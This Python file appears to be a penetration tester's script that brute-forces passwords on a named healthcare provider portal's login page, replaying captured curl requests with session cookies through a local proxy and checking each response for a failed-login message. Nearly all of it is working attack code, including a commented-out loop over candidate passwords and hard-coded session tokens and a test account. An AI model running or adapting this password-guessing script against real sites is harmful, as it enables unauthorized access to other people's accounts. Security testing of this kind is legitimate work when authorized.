import os
import subprocess

def executeTest(x):
    
    subprocess.call("curl -i -s -k  -X POST \
        -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' --proxy http://127.0.0.1:8080/ -H 'Referer: http://tngprovider.multiplan.com/provider/faces/oracle/webcenter/portalapp/pages/login.jspx?_afrLoop=2830242227660065&_afrWindowMode=0&_afrWindowId=null&_adf.ctrl-state=ysrm5fp8f_1' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Adf-Rich-Message: true' \
        -b '_ga=GA1.2.277979393.1503596018; JSESSIONID=ChhchnJDvsT5BmQJnny4QqTq1QxgD1Rj1y3hmCLfQnzhFljtrwnC!-917013172!NONE; _gid=GA1.2.25946535.1513018537; _gat=1' \
        --data-binary 'pt1:pt_sf2:pt_it12=tester22%40includesecurity.com&pt1:pt_sf2:pt_it3=User1"+str(x)+"&org.apache.myfaces.trinidad.faces.FORM=f1&javax.faces.ViewState=!13gaj3g434&event=pt1%3Apt_sf2%3Apt_logincb3&event.pt1:pt_sf2:pt_logincb3=%3Cm+xmlns%3D%22http%3A%2F%2Foracle.com%2FrichClient%2Fcomm%22%3E%3Ck+v%3D%22type%22%3E%3Cs%3Eaction%3C%2Fs%3E%3C%2Fk%3E%3C%2Fm%3E&oracle.adf.view.rich.PPR_FORCED=true' \
        http://tngprovider.multiplan.com/provider/faces/oracle/webcenter/portalapp/pages/login.jspx?_adf.ctrl-state=ysrm5fp8f_5",shell=True)

    res = subprocess.call("curl -i -s -k  -X GET \
        -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H 'Referer: http://tngprovider.multiplan.com/provider/faces/oracle/webcenter/portalapp/pages/login.jspx' --proxy http://127.0.0.1:8080/ -H 'Upgrade-Insecure-Requests: 1' \
        -b '_ga=GA1.2.277979393.1503596018; JSESSIONID=ChhchnJDvsT5BmQJnny4QqTq1QxgD1Rj1y3hmCLfQnzhFljtrwnC!-917013172!NONE; _gid=GA1.2.25946535.1513018537; _gat=1' \
        http://tngprovider.multiplan.com/provider/faces/oracle/webcenter/portalapp/pages/login.jspx?_afrLoop=2830268760978065&_afrWindowMode=0&_afrWindowId=59u5p8b19&_adf.ctrl-state=ysrm5fp8f_18 > /home/crodriguez/Documents/Proyectos/Multiplan-provider-portal/output.txt",shell=True)


def executeOperation(x):
    res=os.system("curl -i -s -k  -X $'POST' \
        -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' --proxy http://127.0.0.1:8080/ -H $'Referer: http://tngprovider.multiplan.com/provider/faces/oracle/webcenter/portalapp/pages/login.jspx?_afrLoop=2830242227660065&_afrWindowMode=0&_afrWindowId=null&_adf.ctrl-state=ysrm5fp8f_1' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Adf-Rich-Message: true' \
        -b $'_ga=GA1.2.277979393.1503596018; JSESSIONID=ChhchnJDvsT5BmQJnny4QqTq1QxgD1Rj1y3hmCLfQnzhFljtrwnC!-917013172!NONE; _gid=GA1.2.25946535.1513018537; _gat=1' \
        --data-binary $'pt1:pt_sf2:pt_it12=tester22%40includesecurity.com&pt1:pt_sf2:pt_it3=User1"+str(x)+"&org.apache.myfaces.trinidad.faces.FORM=f1&javax.faces.ViewState=!13gaj3g434&event=pt1%3Apt_sf2%3Apt_logincb3&event.pt1:pt_sf2:pt_logincb3=%3Cm+xmlns%3D%22http%3A%2F%2Foracle.com%2FrichClient%2Fcomm%22%3E%3Ck+v%3D%22type%22%3E%3Cs%3Eaction%3C%2Fs%3E%3C%2Fk%3E%3C%2Fm%3E&oracle.adf.view.rich.PPR_FORCED=true' \
        $'http://tngprovider.multiplan.com/provider/faces/oracle/webcenter/portalapp/pages/login.jspx?_adf.ctrl-state=ysrm5fp8f_5'")


    res=os.system("curl -i -s -k  -X GET \
        -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H 'Referer: http://tngprovider.multiplan.com/provider/faces/oracle/webcenter/portalapp/pages/login.jspx' --proxy http://127.0.0.1:8080/ -H 'Upgrade-Insecure-Requests: 1' \
        -b '_ga=GA1.2.277979393.1503596018; JSESSIONID=ChhchnJDvsT5BmQJnny4QqTq1QxgD1Rj1y3hmCLfQnzhFljtrwnC!-917013172!NONE; _gid=GA1.2.25946535.1513018537; _gat=1' \
        'http://tngprovider.multiplan.com/provider/faces/oracle/webcenter/portalapp/pages/login.jspx?_afrLoop=2830268760978065&_afrWindowMode=0&_afrWindowId=59u5p8b19&_adf.ctrl-state=ysrm5fp8f_18' > /home/crodriguez/Documents/Proyectos/Multiplan-provider-portal/output.txt")

    file_opened = open("/home/crodriguez/Documents/Proyectos/Multiplan-provider-portal/output.txt","r")
    result = file_opened.read()

    if 'Incorrect Email or Password' in result:
        print('no encontrado')
    else:
        print('encontrado') 
    
    os.remove('/home/crodriguez/Documents/Proyectos/Multiplan-provider-portal/output.txt')


#executeOperation(200)
#for x in range (0,130):
executeTest(2)

